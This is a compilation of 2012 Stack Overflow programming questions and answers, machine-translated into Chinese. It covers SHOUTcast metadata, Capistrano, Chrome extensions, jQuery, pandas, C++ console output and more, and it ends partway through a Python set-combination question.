您好，我正在尝试在 iOS 中解析 Shoutcast 广播的元数据。

在尝试了许多提交的解决方案之后，我最终得到了一段仍然给我错误的代码

**响应字符串：ICY 404 Resource Not Found icy-notice1：
SHOUTcast 分布式网络音频服务器/Linux v1.9.8
icy-notice2：未找到请求的资源** 

我试图解析元数据的代码

```
NSURL *url = [NSURL URLWithString:@"http://relay.181.fm:8052/7.html"];

NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:15.0];

   [request addValue:@"1" forHTTPHeaderField:@"icy-metadata"];
   [request addValue:@"Winamp 5/3" forHTTPHeaderField:@"User-Agent"];
   [request addValue:@"audio/mpeg" forHTTPHeaderField:@"Content-Type"];

[request setHTTPMethod:@"GET"];

NSData *data = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];

NSString* responseString = [[NSString alloc] initWithData:data encoding: NSUTF8StringEncoding];

NSLog(@"Response String: %@", responseString); 
```

关于问题的任何想法，感谢您的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:36:35.560

并非所有 SHOUTcast 服务器都允许访问`7.html`. 还有另外两种获取该数​​据的方法。

SHOUTcast 的 XML 数据通常可用，但需要服务器的密码。您可以使用`/admin.cgi?mode=viewxml&page=4`.

您还可以直接从流中读取元数据。这比较麻烦，但完全有可能，而且难度不大。有关详细信息，请参阅此答案： [https ://stackoverflow.com/a/4914538/362536](https://stackoverflow.com/a/4914538/362536)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-24T11:19:03.243

当前歌曲也显示在 /played.html 页面上，但它与 /7.html 一起在 Web 浏览器中工作。但是当我在 Windows 机器上尝试使用 fiddler2 时，我得到了 ICY 404 resource not found 错误

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-27T08:59:45.923

我为那些不能/不想从流中读取元数据的人找到了一个解决方案。这是我见过的最简单的解决方案。

[http://www.fvalente.org/blog/2012/03/15/shoutcast-metadata-the-easy-way/](http://www.fvalente.org/blog/2012/03/15/shoutcast-metadata-the-easy-way/)

布拉德在上面的帖子中说

> 并非所有 SHOUTcast 服务器都允许访问 7.html。

所以最好检查你要获取元数据的服务器是否有/7.html页面

# ruby - 将 Capistrano deploy.rb 文件中的值传递给应用程序

> ID：13572507
> 
> 赞同：1
> 
> 时间：2012-11-26T20:20:41.360
> 
> 标签：ruby, configuration, sinatra, capistrano

在 Capistrano 的 deploy.rb 文件中，我设置了不同的环境，例如服务器名称、端口等。我还要求用户向另一台服务器发送回调，该服务器也在 deploy.rb 中定义。如何干净利落地将此值传递给我的应用程序？

有这样的效果：

配置/部署.rb：

```
set :callback_url, "http://somecallbackurl.com:12345/bla" 
```

应用程序/控制器/myapp.rb：

```
def get_callback_url
   ???
end 
```

我正在使用 Sinatra。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T00:12:52.170

我找到了一个解决方案，那就是使用环境变量。

从 deploy.rb 设置它

```
run "export CALLBACK_URL=#{callback_url}" 
```

从应用程序：

```
def get_callback_url
    ENV['CALLBACK_URL']
end 
```

我不会说这是最干净的解决方案，但它确实有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:27:45.790

我可能会建议使用共享的 YAML 文件来存储这种配置，并单独加载它。例如，有一个名为类似 的文件`config/settings.yml`，其中包含以下内容：

```
:callback_url: "http://somecallbackurl.com:12345/bla" 
```

在`config/deploy.rb`中，您可以：

```
settings = YAML.load_file('config/settings.yml')
set :callback_url, settings[:callback_url] 
```

在 中`config/initializers/settings.rb`，您可以：

```
settings = YAML.load_file('config/settings.yml')
CALLBACK_URL = settings[:callback_url] 
```

最后，在 中`app/controllers/myapp.rb`，您将执行以下操作：

```
def get_callback_url
   CALLBACK_URL
end 
```

使用共享 YAML 文件只是我想到的第一件事。另一种方法是在 ruby​​ 文件中定义一些常量，并在初始化程序和`deploy.rb`. 基本思想是你并不真的希望你的应用程序依赖于你的 capistrano 环境，所以你应该找到一种方法来分离共享配置。

# google-chrome-extension - 如何从 Google Chrome 扩展更改网页内容

> ID：13572515
> 
> 赞同：4
> 
> 时间：2012-11-26T20:21:07.543
> 
> 标签：google-chrome-extension, message

我正在编写扩展程序，它将强调网页上英语单词的重音。单击弹出窗口上的“搜索”按钮后，我被卡住了，似乎没有任何反应。

这是场景：

1.  用户双击网页上的单词。
2.  整个单词都被标记了。
3.  用户单击 chrome 浏览器栏上的扩展程序图标。
4.  显示一个弹出窗口。弹出窗口中的输入字段用标记的单词填充。
5.  用户添加口音。IE。如果标记的单词是“边界”，在弹出的输入字段中将显示：“边界”。然后用户将输入值修改为：'boudary,bo'（不带引号）。
6.  用户单击弹出窗口上的“搜索”按钮。
7.  页面上“边界”字中的字母“bo”有下划线。

**清单.json**

```
{
  "content_scripts": [ {
    "js": [ "jquery.js", "jquery.highlight-4.js", "selection.js" ],
    "matches": [ "\u003Call_urls\u003E" ]
  } ],
  "name": "Mark accent",
  "version": "1.0",
  "manifest_version": 2,
  "options_page": "options.html",
  "description": "Marks accent in english words for selected word on page",
  "browser_action": {
    "default_icon": "icon.png",
    "default_popup": "popup.html"
  },
  "icons": {
    "128": "icon.png"
  },
  "permissions": [ "tabs", "http://*/*", "https://*/*", "storage", "file:///*" ]
} 
```

**应用程序.js**

```
chrome.tabs.getSelected(null, function(tab) {
  chrome.tabs.sendRequest(tab.id, {method: "getSelection"}, function (response) {
    $("#t1").val(response.data);
    console.log('input t1 value: ' + $("#t1").val(response.data));
  });
});
$("#t1").keypress(function(event) {
  if ( event.which == 13 ) {
    $("#search_btn").click();
  }
});
$("#t1").focus();

function search(that) {
  var token = new String (t1.value);
  chrome.tabs.executeScript(null,
    {code:"$(document.body).highlight('"+token+"','text-decoration:underline')"});
  window.close();
} 
```

**选择.js**

```
chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
  if (request.method == "getSelection")
    sendResponse({data: window.getSelection().toString()});
  else
    sendResponse({}); // snub them.
}); 
```

**popup.html**

```
<style>
body {
overflow: hidden; margin: 5px; padding: 0px; background: black;color: white;
width: 300px; font-family: 'Droid Sans', arial, sans-serif;
}
</style>
Please enter the word to highlight :
<input type="text" id="t1"/>
  <button onclick="search(this)" id="search_btn">Search</button>
  <button onclick="hl_clear(this)" id="clear_btn">Clear all highlights</button>
  <script src="jquery.js"></script>
<script src="jquery.highlight-4.js"></script>
<script src="app.js"></script> 
```

**jquery.highlight-4.js**

```
jQuery.fn.highlight = function(pat, fbgcolor) {
  function innerHighlight(node, pat, fbgcolor) {
    var skip = 0;
    var array = pat.split(',');
    var sWord = array[0];
    var accent = array[1];
    if (node.nodeType == 3) {
      var pos = node.data.toUpperCase().indexOf(sWord);
      if (pos >= 0) {
        var middlebit = node.splitText(pos);
        var endbit = middlebit.splitText(sWord.length);
        var pos2 = middlebit.data.toUpperCase().indexOf(accent);
        if (pos2 >= 0) {
          var spannode = document.createElement('span');
          spannode.className = 'highlight';
          fbgcolor += ";padding: 0px; margin: 0px;";
          spannode.setAttribute('style', fbgcolor);
          var middlebit2 = middlebit.splitText(pos2);
          var endbit2 = middlebit2.splitText(accent.length);
          var middleclone2 = middlebit2.cloneNode(true);
          spannode.appendChild(middleclone2);
          middlebit2.parentNode.replaceChild(spannode, middlebit2);
        }
        skip = 1;
      }
    }
    else if (node.nodeType == 1 && node.childNodes && 
             !/(script|style)/i.test(node.tagName)) {
      for (var i = 0; i &lt; node.childNodes.length; ++i) {
        i += innerHighlight(node.childNodes[i], pat, fbgcolor);
      }
    }
    return skip;
  }
  return this.each(function() {
    innerHighlight(this, pat.toUpperCase(), fbgcolor);
  });
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T07:26:31.070

经过如此多的修改并消除了与非 Chrome 扩展相关的内容，它正在工作。您可以将您的内容添加到此骨架中。

不要在 html 中添加内联脚本 `<button onclick="search(this)" id="search_btn">Search</button>`

![在此处输入图像描述](../Images/5005792387629a97dcb68b3d7c92d09e.png)

代码的基本骨架：

***清单.json***

```
{
  "content_scripts": [ {
    "js": [ "jquery.js", "jquery.highlight-4.js", "selection.js" ],
    "matches": [ "<all_urls>" ]
  } ],
  "name": "Mark accent",
  "version": "1.0",
  "manifest_version": 2,
  "description": "Marks accent in english words for selected word on page",
  "browser_action": {
    "default_icon": "icon.png",
    "default_popup": "popup.html"
  },
  "icons": {
    "128": "icon.png"
  },
  "permissions": [ "tabs", "<all_urls>" ]
} 
```

***应用程序.js***

```
function search(that) {
    console.log("Search is clicked");
  var token = document.getElementById("t1").value;
  console.log(token);
  chrome.tabs.executeScript(null,
    {code:"highlight();"});
  //window.close();
}
window.onload=function (){
    document.getElementById("search_btn").onclick=search;

}; 
```

***选择.js***

```
chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
  if (request.method == "getSelection")
    sendResponse({data: window.getSelection().toString()});
  else
    sendResponse({}); // snub them.
}); 
```

***popup.html***

```
<html>
<head>
<style>
body {
overflow: hidden; margin: 5px; padding: 0px; background: black;color: white;
width: 300px; font-family: 'Droid Sans', arial, sans-serif;
}
</style>
  <script src="jquery.js"></script>
<script src="app.js"></script>
<body>
Please enter the word to highlight :
<input type="text" id="t1"/>
  <button id="search_btn">Search</button>
  <button id="">Clear all highlights</button>
</body>
</html> 
```

***jquery.highlight-4.js***

```
function highlight(){
    console.log("Highlight is called");
} 
```

让我知道它是否仍然失败。

# jquery - 在chrome中拖动时如何阻止列表项跳跃？

> ID：13572516
> 
> 赞同：0
> 
> 时间：2012-11-26T20:21:08.823
> 
> 标签：jquery, html-lists, drag, jquery-ui-sortable

我正在使用两个 UL 并使用 javascript 水平滚动它们，但是当在列表之间拖动列表项时它们会跳跃约 10-20 像素。这发生在 chrome 中，但不在 Firefox 中。问题是，在将 UL Li 设置为 float:left 时，它在 chrome 中已修复，但这会破坏 Firefox 中的整个内容（列表不会停留在一行上）。帮助！

这是网页，请在 webkit/chrome 和 firefox 中打开

[http://www.senseculture.com/timeline_new.html](http://www.senseculture.com/timeline_new.html)

我用于可拖动的代码是：

```
<script>
  $(function() {
        $( "#sortable1, #sortable2" ).sortable({
            connectWith: ".timeline_content"
        }).disableSelection();
    });
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:19:27.483

似乎 Chrome 对待默认 css 属性的方式与 Firefox 不同。您可以传递一个选项以`Selectable`向`placeholder`- 添加一个类，这使您可以轻松地设置以下样式`placeholder`：

```
$(function() {
        $( "#sortable1, #sortable2" ).sortable({
            connectWith: ".timeline_content",
            placeholder: "timeline-placeholder"
        }).disableSelection();
    }); 
```

以下风格（虽然有点奇怪）对我有用：

```
.timeline-placeholder {
    display:  inline !important;
    padding:  0 99px;
    width:  2px;
} 
```

我通常不喜欢使用`!important`/限制其使用的需要，但默认行为`placeholder`将设置为`display: block`需要覆盖的行为。

**编辑**：我找到了一种解决您的问题的方法，但不是原因 - 有兴趣看看是否有人知道是什么属性或属性组合导致了这种情况。

# c# - 简单情况下的 jQuery 确认替换

> ID：13572517
> 
> 赞同：0
> 
> 时间：2012-11-26T20:21:13.670
> 
> 标签：c#, jquery, asp.net, visual-studio-2010, confirm

我如何用这个 jQuery Confirm 替换下面的代码：
[jQuery Alert Dialogs (Alert, Confirm, & Prompt Replacements)](http://www.abeautifulsite.net/blog/2008/12/jquery-alert-dialogs/)

和代码：

```
OnClientClick="javascript:if(!confirm('Are you sure you want to delete this row?')){return false;} 
```

和 jQuery 的确认代码：

```
jConfirm('Can you confirm this?', 'Confirmation Dialog', function(r) {
    jAlert('Confirmed: ' + r, 'Confirmation Results');
}); 
```

我测试了很多方法都没有结果...
在此先感谢

# c# - 如何使套接字客户端准备好发送和接收而不需要服务器的操作？

> ID：13572522
> 
> 赞同：3
> 
> 时间：2012-11-26T20:21:27.880
> 
> 标签：c#, python

我有一个 server.py 套接字代码和 client.py。现在我需要客户端始终准备好（处于待机状态）以接收数据，即使它没有向服务器发送任何数据。可以这样做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:24:55.450

Well, I suppose what you need is select module.

[http://www.doughellmann.com/PyMOTW/select/](http://www.doughellmann.com/PyMOTW/select/)

The idea is that with the help of select you can wait for different types of events (read, write, exception) that happen on sockets passed to select's input.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:31:35.160

我用它来接收从一些 C# 代码发送的数据，这些代码是我在 Python 中处理的。当您使用接收到的数据在其他线程中执行操作时，它使用线程“永远监听”。希望这可以帮助：

```
import threading
import SocketServer

class UDPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        ## DO SOMETHING USEFUL WITH WHAT YOU RECEIVE VIA self:
        data = self.request[0].strip()  # in this case, self.request[0] contains a string
        # etc.

class Listener(threading.Thread):
    def run(self):
        HOST = "192.168.1.23"
        PORT = 8888
        server = SocketServer.UDPServer((HOST, PORT), UDPHandler)
        server.serve_forever()

Listener().start() 
```

# javascript - 未捕获的类型错误：对象 [object Object] 没有方法“addEventlistner”

> ID：13572527
> 
> 赞同：1
> 
> 时间：2012-11-26T20:22:01.470
> 
> 标签：javascript, jquery

我收到一个错误 Uncaught TypeError: Object [object Object] has no method 'addEventlistner' 添加此代码时，我无法理解它:(

```
$('video').addEventlistner('timeupdate', function(event) {
    var current = Math.round(event.target.currentTime * 1000);
    var total = Math.round(event.target.duration * 1000);
    $('temps_total').empty().appendText(total);
    $('temps_courant').empty().appendText(current)
    $('temps_restant').empty().appendText(total - current);
    }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:24:23.570

因为`$('video')`返回一个 jquery 对象。

这是您可以执行的操作：

```
$('video')[0].addEventListener('timeupdate', function(event) { 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:24:21.387

您不会使用`addEventListener`，`addEventlistner` **但**也不是 jQuery 方法。

阅读此[http://api.jquery.com/on/](http://api.jquery.com/on/)

```
$('video').on('timeupdate', function(event) {
    var current = Math.round(event.target.currentTime * 1000);
    var total = Math.round(event.target.duration * 1000);
    $('temps_total').empty().appendText(total);
    $('temps_courant').empty().appendText(current)
    $('temps_restant').empty().appendText(total - current);
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:24:24.380

jQuery 对象没有`addEventListener`方法。
相反，您应该调用`.bind()`.

# jakarta-ee - 针对 EJB 运行 JUnit

> ID：13572530
> 
> 赞同：0
> 
> 时间：2012-11-26T20:22:16.233
> 
> 标签：jakarta-ee, junit

久违了，我又回到了 Java EE，所以我基本上不得不从头开始学习现代 EE。作为这项努力的一部分，我正在尝试边做边学。我有一个功能性沙箱可供使用——一个简单的应用程序，其中前端由一个 EJB 通过 JPA 与数据库通信提供支持。

为了帮助我学习，我正在尝试设置一些 JUnit 测试。不幸的是，它们不起作用，而且由于我在很多方面都没有超出“猴子看，猴子做”阶段，所以我很难解决我看到的问题。

以下是我为测试 MyEJB 而设置的代码，它被定义为`@Stateless`and `@LocalBean`。（如果重要的话，我正在运行 Glassfish/Eclipse。）

```
 public class MyEJBTest {
    private static EJBContainer ejbContainer;

    private MyEJB myEJB; 

    @BeforeClass
    public static void startTheContainer() {
        ejbContainer = EJBContainer.createEJBContainer();
    }

    @Before
    public void lookupABean() throws NamingException {
        Object object = ejbContainer.getContext().lookup("java:global/simple-stateless/MyEJB");

        assertTrue(object instanceof MyEJB);

        myEJB = (MyEJB) object;
    }

    @AfterClass
    public static void stopTheContainer() {
        if (ejbContainer != null) {
            ejbContainer.close();
        }
    }

    @Test
    public void testFind() {
        MyEntity myEntity = myEJB.find(1); 
        assertTrue(myEntity != null);
        assertEquals("First Row's Name", myEntity.getName());
    }

} 
```

当我将其作为 JUnit 测试运行时，我在`startTheContainer()`调用中收到此错误：

```
javax.ejb.EJBException：没有可用的 EJBContainer 提供程序：没有找到提供程序名称。

```

我该如何解决？还是我的方法从根本上是错误的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-27T10:02:42.623

好吧，`EJBContainer`API 需要`EJBContainerProvider`在类路径上提供 SPI 实现。对于 GlassFish，您需要在类路径中嵌入 GlassFish JAR。如果您使用的是 Maven，这些`org.glassfish.extras:glassfish-embedded-all:3.1.1`是 3.1.1 嵌入式版本的坐标。

也就是说，最好使用 Arquillian 来管理 EJB 容器的生命周期。虽然现在它可能并不重要，但如果您遇到嵌入式 Java EE 容器特有的类路径污染问题，它允许您保留将 EJB 部署到真实容器的选项。

# node.js - 具有动态挂载点的中间件？

> ID：13572535
> 
> 赞同：0
> 
> 时间：2012-11-26T20:22:21.833
> 
> 标签：node.js, express, connect, middleware

我想为以缓存破坏器**开头的路径提供静态资产：**

*   example.com/40/app.js
*   example2.com/5/hello/hello.js
*   example2.com/60000/hello/world/some-file.js

Express 支持吗？

我试图创建一个自定义中间件

*   创建请求对象的副本
*   从 req.path 中剥离缓存破坏器
*   将新的 req 对象传递给 express.static

但这似乎不起作用。看来 Express.static 不直接检查 req.path 。

实现这一目标的最佳方法是什么？任何帮助，将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:18:27.707

如果我理解正确，您想根据 url 过滤 express 中间件？大多数情况下，当您需要包装中间件时。

```
function (req, res, next) {
    if (req.url === 'something') {
      return express.static(__dirname + '/public')(req, res, next);
    }

    next();
} 
```

# javascript - 使用 JavaScript 更改背景颜色

> ID：13572536
> 
> 赞同：0
> 
> 时间：2012-11-26T20:22:26.577
> 
> 标签：javascript, html, css, background-color

我需要使用 Javascript 更改我的一个主要容器 div 的背景。最终目标是应用渐变，但我在更改背景颜色时遇到了问题。这是代码：

```
var main = document.getElementById("main");
  main.parentNode.style.maxWidth = 0;
  main.parentNode.style.maxHeight = 0;
  main.parentNode.style.margin = "0px";
  main.style.backgroundColor = "black"; 
```

这就是页面加载和 JS 执行后标签在浏览器中的样子。

```
<div id="main" style="z-index: 10; position: relative; top: 0px; left: 0px; background-color: black;"> 
```

我没有收到任何 JS 错误。JS 正在执行其他代码运行，并且代码中的背景颜色已更改但未呈现。我最关心的浏览器是 Safari，但我在 Chrome 中得到了相同的效果。任何帮助将非常感激。

**编辑：**这是一个小提琴：http: [//jsfiddle.net/hz7AR/](http://jsfiddle.net/hz7AR/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:27:14.513

您正在将父容器设置为 maxWidth 0 和 maxHeight 0。我认为有问题

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:34:50.023

您需要设置 div 的宽度和高度。目前 div 没有宽度或高度，将您的 html 更改为：

```
<div id="main" style="z-index: 10; position: relative; top: 0px; left: 0px; background-color: black; height: 100px; width: 100px"> 
```

该代码使 div 为 100 x 100 像素，您可以将其设置为您喜欢的任何内容

# mysql - MYSQL 内连接并从子查询中获取值

> ID：13572538
> 
> 赞同：1
> 
> 时间：2012-11-26T20:22:37.150
> 
> 标签：mysql, in-subquery

好的，我正在尝试比较两个表，然后从三分之一的名称中输入一个列表，以生成前 10 天的总值。查询运行，但给我一个 NULL 结果，只有一个结果。如果我删除 DATE_ADD 并将其替换为数据库中的真实日期并为 left 子句输入一个值而不是使用子查询，我确实得到了我正在寻找的特定日期。我想做的是创建一个名称列表，其中包含当天和过去 10 天的值。我确信我做的不对，所以任何帮助都会受到赞赏，因为我对此很陌生。简单的查询很容易，但像这样复杂的东西对我来说是新的。

```
select sum(t.price) from td.trs as t
inner join td.order as o on o.trsid=t.id
inner join pts.product as p on p.id=o.grp_id
where t.invoice_date=DATE_ADD(CURRENT_DATE(),INTERVAL 10 DAY)
and left(t.mfgid,3) IN (select name from name.list); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:25:18.593

change

```
where t.invoice_date=DATE_ADD(CURRENT_DATE(),INTERVAL 10 DAY) 
```

to

```
where t.invoice_date >= DATE_ADD(CURRENT_DATE(),INTERVAL -10 DAY) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:28:53.470

您可能没有得到任何结果，因为您正在执行`DATE_ADD`，`CURRENT_DATE()`这将为您提供 10 天后的日期。如果您想获取过去 10 天的所有项目，请使用

```
WHERE t.invoice_date BETWEEN CURRENT_DATE() AND DATE_SUB(CURRENT_DATE(), INTERVAL 10 DAY) 
```

# python - 尝试将声音文件编码为 base64 时出错

> ID：13572541
> 
> 赞同：0
> 
> 时间：2012-11-26T20:22:51.423
> 
> 标签：python, python-3.x

我做了这行代码，我得到了这个错误“文件“C:\Python33\lib\base64.py”，第 326 行，在编码 output.write(line) TypeError: must be str, not bytes"

```
import base64

with open('trang_base64.wav', 'rb') as fin, open('output.b64', 'w') as fout:
base64.encode(fin, fout) 
```

上面的代码有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:27:21.783

我认为您需要将输出设置为二进制模式：

打开（'输出.b64'，'wb'）

Python3 采用文本模式，除非您指定：

[http://docs.python.org/3.3/tutorial/inputoutput.html#reading-and-writing-files](http://docs.python.org/3.3/tutorial/inputoutput.html#reading-and-writing-files)

# c++ - 如何在 C++ 中将光标位置设置为行首？

> ID：13572545
> 
> 赞同：1
> 
> 时间：2012-11-26T20:23:01.190
> 
> 标签：c++, linux

所以我试图在代码中写一些东西，然后覆盖它。像这样：

```
10 seconds have passed
11 seconds have passed
12 seconds have passed 
```

无需使用新行来打印它。所以我不想使用这样的东西：

```
std::cout<<"10 seconds have passed\n"
std::cout<<"11 seconds have passed\n" 
```

我该怎么做呢？我正在运行 Kubuntu Linux

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-26T20:25:36.310

That's what the carriage return character is for: `\r`. It is named after the mechanism of typewriters that returns the paper carriage to the right so that the typist can continue typing from the beginning of a line. Try this:

```
std::cout << "10 seconds have passed";
std::cout << "\r11"; 
```

Of course, with no delay between the two (except perhaps waiting on I/O), you're unlikely to see the change, but you will at least see the output as `11 seconds have passed` with `10` nowhere to be seen.

How to display the carriage return is entirely up to whatever you're outputting to, but this is its intention. For more complex cross-platform terminal output, take a look at [ncurses](http://www.gnu.org/software/ncurses/).

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-26T20:39:31.547

```
#include <conio.h>
#include <consoleapi.h>

void gotoxy(short x, short y)       
{ 
    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD position = { x, y };

    SetConsoleCursorPosition(hStdout, position);
} 
```

如果您需要更好地在控制台中移动。（我不知道为什么它没有正确显示#include conio.h

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:25:19.040

Try

```
cout<<"\roverride" 
```

With no linebreak at the end. The \r means carage return which means to jump to the beginning of a line.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T20:26:05.713

Besides `\r` (that takes you back to the beginning of the line), you can also use the `\b` character to get back of one character. If you have to do more complicated stuff, you'll have to use the VT100 escape codes or some library (like ncurses).

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-26T20:27:08.723

回车`'\r'`负责移回行首。

并不是说您必须覆盖所有已写入的字符，因为它们不会在显示时自动删除。

并且不要忘记调用 std::cout 的刷新，因为否则在 unix 机器上，在刷新之前您可能看不到任何结果。

# macos - NSTableView - 选择行并立即响应鼠标事件

> ID：13572547
> 
> 赞同：3
> 
> 时间：2012-11-26T20:23:09.603
> 
> 标签：macos, cocoa, nstableview, nstablecellview

我有一个基于视图的 NSTableView，其中的单元格包含许多控件，包括文本字段和编辑字段。例如，当用户尝试单击单元格中的控件以开始编辑文本字段时，将忽略单击的主要目标并选择单元格。然后需要再次单击来执行最初打算执行的操作，即使此单击在考虑到它之前也会受到延迟。

如何避免此问题并一次性选择行并将鼠标事件转发到控件？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-27T07:38:36.933

我通过继承 NSTableView 解决了这个问题：

```
@implementation QuickResponseTableView

- (BOOL)validateProposedFirstResponder:(NSResponder *)responder forEvent:(NSEvent *)event
{
    // This allows the user to click on controls within a cell withough first having to select the cell row
    return YES;
}

@end 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-26T10:07:56.417

有同样的问题。经过一番努力，当我在 IB中选择`None`默认`Regular`选项（其他选项是`Source List`）时，它神奇地起作用了！`Highlight`与此相比，接受的答案似乎更具体，但有点老套。

# svn - 在一个项目中管理多个分支 intellij

> ID：13572548
> 
> 赞同：2
> 
> 时间：2012-11-26T20:23:12.190
> 
> 标签：svn, configuration, intellij-idea

在我目前工作的地方，每个发布周期都有一个新的 svn 分支，所以我需要在同一个项目的多个分支上工作。这给我带来了问题，因为有时我在错误的分支中编辑文件并提交我想要避免的错误分支。

目前我为每个分支创建一个新模块并从项目中删除另一个模块分支以避免上述问题。我可以避免在切换分支时删除和添加模块吗？

我尝试过： 使用上下文 - 我保存了一个上下文，交换了模块然后保存了另一个上下文，但是当我在上下文之间切换时它们是相同的，它不会切换模块。

一个不错的解决方案是将每个模块放在一个单独的更改列表中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T18:16:44.443

考虑

*   [每个分支都有单独的 IntelliJ 项目（就像在 IntelliJ IDEA 中的多个 SVN 分支的工作流中](https://stackoverflow.com/questions/10296930/workflow-for-multiple-svn-branches-in-intellij-idea/10297121#10297121)已经提到的那样）
*   svn switch 命令根据您当前使用的版本指向工作区中的不同分支 [http://ldc.usb.ve/docs/svn/svn.branchmerge.switchwc.html](http://ldc.usb.ve/docs/svn/svn.branchmerge.switchwc.html)

此外，使用补丁/架子来重用本地配置。

希望这可以帮助！

# pandas - 将多个不同列数的数据框合并为一个大数据框

> ID：13572550
> 
> 赞同：1
> 
> 时间：2012-11-26T20:23:17.727
> 
> 标签：pandas

我有两个列数和行数不同的 CSV 文件。第一个 CSV 文件有 M 列和 N 行，第二个有 H 列和 G 行。一些列具有相同的名称。

我想将两者结合到具有以下属性的数据框中：

*   N+G 行
*   (M, H) 列的并集
*   如果 A 列是第一个 CSV 文件的元素但不是第二个文件的元素，则数据框应在 A 的前 N ​​个条目中包含与第一个 CSV 中相同的值，其余的（因为第二个 CSV 中没有 A 数据）应该是不适用。

这是一个例子：

```
CSV1
City, Population,
Zagreb, 700000,
Rijeka, 142000

CSV2
City, Area,
Split, 200.00
Osijek, 171.00
Dubrovnik, 143.35 
```

我想构建一个如下所示的数据框：

```
City      Population   Area
Zagreb    700000       NA
Rijeka    142000       NA
Split     NA           200.00
Osijek    NA           171.00
Dubrovnik NA           143.35 
```

另外，如果我有两个 CSV 文件，我有两个数据框并想要做同样的事情，例如，如果我将第一个 csv 加载到`df1`第二个`df2`，然后想要合并到`df3`上面的示例，该怎么办。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T22:59:22.900

为什么不试试这个[`concat`](http://pandas.pydata.org/pandas-docs/stable/merging.html#concatenating-objects)功能：

```
In [25]: df1
Out[25]: 
     City  Population
0  Zagreb      700000
1  Rijeka      142000

In [26]: df2
Out[26]: 
        City    Area
0      Split  200.00
1     Osijek  171.00
2  Dubrovnik  143.35

In [27]: pd.concat([df1,df2])
Out[27]: 
     Area       City  Population
0     NaN     Zagreb      700000
1     NaN     Rijeka      142000
0  200.00      Split         NaN
1  171.00     Osijek         NaN
2  143.35  Dubrovnik         NaN

In [28]: pd.concat([df1,df2], ignore_index=True)
Out[28]: 
     Area       City  Population
0     NaN     Zagreb      700000
1     NaN     Rijeka      142000
2  200.00      Split         NaN
3  171.00     Osijek         NaN
4  143.35  Dubrovnik         NaN 
```

*注意：[`concat`](http://pandas.pydata.org/pandas-docs/stable/generated/pandas.tools.merge.concat.html?highlight=concat#pandas.tools.merge.concat)如果您的要求略有不同，则确实有一些额外的选项。*

# django - Django/Selenium 如何防止多次创建固定装置（在 LiveServerTestCase 运行期间）？

> ID：13572552
> 
> 赞同：1
> 
> 时间：2012-11-26T20:23:28.743
> 
> 标签：django, testing, selenium, django-testing

问题：我正在使用 factory_boy 创建一些模型对象，因此我不必在测试中使用固定装置（但这不会导致问题）。我有一个名为 _create_fixtures() 的函数，它在我的类的 setUp() 中调用，它导致以下 IntegrityErrors：[http](http://dpaste.org/ggC5U/) ://dpaste.org/ggC5U/ 。

我只想在第一次运行测试时创建这些对象，这样他们就不会不断收到这些错误。

有关更多信息，这是测试类：[http ://dpaste.org/a6eFb/](http://dpaste.org/a6eFb/)

在此先感谢您的帮助。

# python - 从列表元素中查找互斥集的python组合

> ID：13572559
> 
> 赞同：9
> 
> 时间：2012-11-26T20:23:45.687
> 
> 标签：python, algorithm

在我目前正在进行的一个项目中，我已经实现了大约 80% 的我希望我的程序做的事情，我对结果非常满意。

在剩下的 20% 中，我面临着一个让我有点不知道如何解决的问题。这里是：

我提出了一个列表列表，其中包含多个数字（任意长度）例如：

```
listElement[0] = [1, 2, 3]
listElement[1] = [3, 6, 8]
listElement[2] = [4, 9]
listElement[4] = [6, 11]
listElement[n] = [x, y, z...] 
```

其中 n 可以达到 40,000 左右。

假设每个列表元素是一组数字（在数学意义上），我想做的是推导出互斥集合的所有组合；也就是说，类似于上述列表元素的幂集，但排除了所有非不相交集元素。

因此，要继续使用 n=4 的示例，我想提出一个具有以下组合的列表：

```
newlistElement[0] = [1, 2, 3]
newlistElement[1] = [3, 6, 8]
newlistElement[2] = [4, 9]
newlistElement[4] = [6, 11] 
newlistElement[5] = [[1, 2, 3], [4, 9]]
newlistElement[6] = [[1, 2, 3], [6, 11]]
newlistElement[7] = [[1, 2, 3], [4, 9], [6, 11]]
newlistElement[8] = [[3, 6, 8], [4, 9]]
newlistElement[9] = [[4, 9], [6, 11] 
```

